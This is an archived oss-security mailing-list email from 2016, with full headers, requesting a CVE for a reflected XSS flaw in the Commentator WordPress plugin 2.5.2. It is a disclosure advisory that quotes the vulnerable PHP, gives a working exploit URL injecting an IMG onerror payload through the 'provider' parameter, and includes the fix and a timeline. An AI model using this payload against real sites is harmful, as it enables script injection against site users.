X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1323" "Wednesday" "13" "January" "2016" "19:42:12" "+0530" "Rahul Pratap Singh" "techno.rps@gmail.com" "<CADLX=aE8i3sGRMXGAAXwrgxY47b-QcPMBQoGRPKOAsmWcTJoZA@mail.gmail.com>" "48" "[oss-security] CVE Request: Commentator WordPress Plugin 2.5.2 XSS Vulnerability" "^Date:" nil nil "1" "2016011314:12:12" "[oss-security] CVE Request: Commentator WordPress Plugin 2.5.2 XSS Vulnerability" (number mark "        techno.rps@g Jan 13   48/1323  " thread-indent "\"[oss-security] CVE Request: Commentator WordPress Plugin 2.5.2 XSS Vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 17727 invoked by uid 550); 13 Jan 2016 14:27:46 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 3329 invoked from network); 13 Jan 2016 14:12:24 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:date:message-id:subject:from:to:content-type;
        bh=iO1N4XNUVzG1Hz3eSly/f+knQgnzqnsqocLWo336tb4=;
        b=mUFZKmWo8zIRnja0xN8xapSop2vDth3jtlTUG8zWxD93BACcRB5QE9J5qOS5xbZvUj
         7ugYKzq2B2FPRD//9s6oNiHPRl//7ssK1msj6wYO8SepLdPkXQLzrTd1qoMp3zC5ClRe
         /Os25aP6BaaFWIJYFBkEPPBfDLYNYAHubez7eYhpvGew4RZ4sc3HpTPY8zY43RZ557mm
         9qqb4970Y/eOYlsSxleNJxyurohMtC9rwiFSrtKOnwDza5CKl82GUMbXgq9uRQb7pn3t
         lrSaz6v4mxPoJeoaFXd92GWbh4FMKPGvoQd/CwY9wuQlafOxl51bLPchmpHytHLtVAmP
         V50Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:date:message-id:subject:from:to
         :content-type;
        bh=iO1N4XNUVzG1Hz3eSly/f+knQgnzqnsqocLWo336tb4=;
        b=kC1XS54KYS7h0J5sr47YoOLBFxzniEt+dbANDaI59RqfPbHc9nJhXd4Dty0uLYVgX/
         hW4M9aY+hFEBZZwyKwXXs13uwwUQE3jHWmR1p+bWQgLErPm1LmIBwJxpQPGzrIx4MzGI
         gUkvHcWNW6X0vsHmQN1rnlOywsNRQbg6D919CU3ZgCCWbNO2A8xhw7iPkAcIL++PQ/q4
         l+UBIDzlrKswe7s2NaCMn5emtBoaEwlEnziqO7UzG13ufLoN1VkKjIU2OLwmpnqiJ5cL
         ePI20XYBo4T2G7u5KPoZzzLSg8MRWLJ3jBJ0TTqySGHpCO6MPgEw8clC5ePrvMBpQCHf
         ZXig==
X-Gm-Message-State: ALoCoQlpiw+57/8HTkLkopDNOpTh6nxSnFwGKuAOXjAcgqhqGTjNc0lVaJPRoXZAUGotm/kYVgAehZznieuaNHd/d7uwBL4KVQ==
MIME-Version: 1.0
X-Received: by 10.50.21.10 with SMTP id r10mr23979934ige.93.1452694332154;
 Wed, 13 Jan 2016 06:12:12 -0800 (PST)
Message-ID: <CADLX=aE8i3sGRMXGAAXwrgxY47b-QcPMBQoGRPKOAsmWcTJoZA@mail.gmail.com>
Content-Type: multipart/alternative; boundary=047d7b86eeaea2ab45052937c1b8
Date: Wed, 13 Jan 2016 19:42:12 +0530
From: Rahul Pratap Singh <techno.rps@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE Request: Commentator WordPress Plugin 2.5.2 XSS Vulnerability
To: oss-security@lists.openwall.com

--047d7b86eeaea2ab45052937c1b8
Content-Type: text/plain; charset=UTF-8

Reflected XSS Vulnerability:

I would request you to assign CVE id to this issue.

----------------------------------------
Description:
----------------------------------------
"provider" parameter is not sanitized that leads to Reflected XSS.

----------------------------------------
Vulnerable Code:
----------------------------------------
file: commentator.php

line:441
$provider_name = $_REQUEST["provider"];

line:544
<div id="commentator-social-signin" class="commentator-<?php echo
$provider_name; ?>">

----------------------------------------
Exploit:
----------------------------------------
/wp-admin/admin-ajax.php?action=commentator_social_signin&provider=facebook">%20<IMG%20SRC=axc%20onerror=alert(1)>

----------------------------------------
POC:
----------------------------------------
https://0x62626262.files.wordpress.com/2016/01/commentatorxsspoc.png

Fix:
Update to 2.5.3

Disclosure Timeline:
reported to vendor  : 9/1/2016
vendor response     : 11/1/2016
vendor acknowledged : 11/1/2016
vendor deployed a patch: 11/1/2016

Pub ref:
http://codecanyon.net/item/commentator-wordpress-plugin/6425752
https://0x62626262.wordpress.com/2016/01/13/commentator-wordpress-plugin-xss-vulnerability

--047d7b86eeaea2ab45052937c1b8--
